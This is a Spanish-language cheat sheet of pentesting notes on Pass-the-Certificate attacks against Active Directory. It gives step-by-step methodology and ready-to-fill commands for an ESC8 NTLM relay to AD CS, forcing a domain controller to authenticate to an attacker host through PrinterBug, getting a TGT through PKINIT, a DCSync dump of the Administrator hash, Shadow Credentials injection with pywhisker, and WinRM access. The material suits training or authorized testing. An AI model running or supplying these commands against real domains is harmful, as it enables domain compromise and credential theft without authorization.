---
tags:
  - PTC
  - AD
---
## Conceptos Clave (TL;DR)

* PKINIT permite el uso de criptografía de clave pública para la autenticación inicial en Kerberos, comúnmente usado para inicios de sesión con tarjetas inteligentes que almacenan las claves privadas.

* Pass-the-Certificate es la técnica que utiliza certificados X.509 para obtener Ticket Granting Tickets (TGTs).

* Este método se emplea principalmente tras explotar vulnerabilidades de Active Directory Certificate Services (AD CS) y en ataques de Shadow Credentials.

* ESC8 es un ataque de retransmisión (Relay) NTLM dirigido al endpoint HTTP de inscripción web de AD CS (`/CertSrv`), el cual está habilitado por defecto y es vulnerable a estas interceptaciones.

  
## Herramientas Clave

* **impacket-ntlmrelayx**: Escucha conexiones entrantes y las retransmite al servicio de inscripción web de AD CS.

* **printerbug.py**: Permite coaccionar a una cuenta de máquina (ej. un Controlador de Dominio) para que se autentique contra un host arbitrario.

* **gettgtpkinit.py (PKINITtools)**: Solicita un TGT utilizando un certificado PFX válido.

* **impacket-secretsdump**: Extrae hashes NTLM ejecutando un ataque DCSync mediante un TGT válido.

* **pywhisker**: Manipula el atributo `msDS-KeyCredentialLink` para ataques de Shadow Credentials desde sistemas Linux.

* **PassTheCert**: Alternativa para autenticarse vía LDAPS y ejecutar ataques si el KDC no soporta el EKU para PKINIT.

  
## Metodología Paso a Paso

1. **Configuración del Relay (ESC8)**: Se levanta un servidor a la escucha para interceptar la solicitud de autenticación y redirigirla hacia la interfaz web de AD CS con el fin de solicitar un certificado (por defecto, usando la plantilla de autenticación de Kerberos).

2. **Coerción de Autenticación**: Dado que es poco probable que un Controlador de Dominio se autentique espontáneamente contra nuestra máquina, se fuerza esta acción explotando vulnerabilidades como el Printer Bug.

3. **Solicitud de TGT (Pass-the-Certificate)**: Con el certificado obtenido, se utiliza PKINIT para solicitar al KDC un TGT válido a nombre de la cuenta de la máquina o usuario comprometido.

4. **Explotación del Acceso (Pass-the-Ticket)**: Una vez exportado el TGT en la variable de entorno, se pueden ejecutar ataques avanzados como un DCSync (si se suplantó al DC) o iniciar una sesión remota (ej. WinRM).

5. **Vía Alternativa (Shadow Credentials)**: Si se posee control sobre el atributo `msDS-KeyCredentialLink` de un usuario (observable como `AddKeyCredentialLink` en BloodHound), se inyecta una clave pública directamente en este atributo. Luego se exporta el certificado PFX resultante para solicitar el TGT de ese usuario y asumir su identidad.

  
## Cheat Sheet de Comandos

```bash
# NTLM Relay hacia AD CS (ESC8)
# -t: Define el endpoint HTTP de inscripción de la CA objetivo.
# --adcs: Habilita la extracción de certificados.
# -smb2support: Habilita el servidor SMB a la escucha.
# --template: Define la plantilla del certificado (KerberosAuthentication u otra descubierta con certipy).

impacket-ntlmrelayx -t http://<TARGET_ADCS_IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```
  
```bash
# Coerción de Autenticación mediante Printer Bug
# Fuerza a la máquina objetivo (<TARGET_MACHINE_IP>) a autenticarse contra el atacante (<ATTACKER_IP>).

python3 printerbug.py <DOMAIN>/<USER>:"<PASSWORD>"@<TARGET_MACHINE_IP> <ATTACKER_IP>
```
  
```bash
# Obtener TGT utilizando el certificado exportado (ESC8)
# -cert-pfx: Ruta al archivo .pfx obtenido.
# -dc-ip: Dirección IP del Controlador de Dominio.
# Último argumento: Ruta donde se guardará el TGT (.ccache).

python3 gettgtpkinit.py -cert-pfx <PATH_TO_CERT>.pfx -dc-ip <TARGET_DC_IP> '<DOMAIN>/<MACHINE_ACCOUNT>$' <OUTPUT_CCACHE_PATH>.ccache
```
  
```bash
# Ataque DCSync utilizando el TGT obtenido
# export: Carga el ticket en memoria.
# -k: Autenticación Kerberos utilizando el ticket exportado.
# -no-pass: No requiere contraseña.
# -just-dc-user: Extrae únicamente el NT hash de este usuario.
export KRB5CCNAME=<OUTPUT_CCACHE_PATH>.ccache

impacket-secretsdump -k -no-pass -dc-ip <TARGET_DC_IP> -just-dc-user Administrator '<DOMAIN>/<MACHINE_ACCOUNT>$'@<DC_FQDN>
```
  
```bash
# Shadow Credentials: Inyección de clave pública
# --target: El usuario víctima al que queremos acceder.
# --action add: Añade la clave al msDS-KeyCredentialLink.

pywhisker --dc-ip <TARGET_DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --target <VICTIM_USER> --action add
```
  
```bash
# Obtener TGT utilizando certificado exportado con contraseña (Shadow Credentials)
# -pfx-pass: La contraseña arrojada por pywhisker durante la inyección.

python3 gettgtpkinit.py -cert-pfx <PATH_TO_CERT>.pfx -pfx-pass '<CERT_PASSWORD>' -dc-ip <TARGET_DC_IP> <DOMAIN>/<VICTIM_USER> <OUTPUT_CCACHE_PATH>.ccache
```
  
```bash
# Conexión vía WinRM utilizando el TGT de la víctima

# -r: Especifica el nombre del dominio Kerberos (debe coincidir con la configuración del krb5.conf).

export KRB5CCNAME=<OUTPUT_CCACHE_PATH>.ccache

evil-winrm -i <TARGET_DC_FQDN> -r <DOMAIN>
```

  
## "Gotchas" y Troubleshooting

* **Servicio Print Spooler**: Para que el ataque de coerción mediante `printerbug.py` sea exitoso, es indispensable que el servicio de cola de impresión (Printer Spooler) esté ejecutándose en la máquina que se intenta coaccionar.

* **Error de Dependencia en PKINITtools**: Si la ejecución de `gettgtpkinit.py` devuelve el error `"Error detecting the version of libcrypto"`, debe solucionarse instalando la biblioteca `oscrypto` directamente desde su repositorio oficial en GitHub (`pip3 install -I git+https://github.com/wbond/oscrypto.git`).

* **Configuración del Entorno Kerberos**: Para herramientas como Evil-WinRM que hacen uso de TGTs, es crítico que el archivo de configuración del sistema (`/etc/krb5.conf`) esté correctamente configurado con los parámetros y nombres del dominio objetivo.

* **Ausencia de Soporte EKU (Fallo de PKINIT)**: En algunos entornos, es posible extraer un certificado válido pero fallar al usarlo para pre-autenticación (obtención del TGT) porque el KDC no soporta el EKU adecuado para dicha máquina. En este escenario alternativo, la metodología debe cambiar hacia la herramienta `PassTheCert` para autenticarse por LDAPS y realizar modificaciones directas al directorio (como cambio de contraseñas o inyección de privilegios DCSync).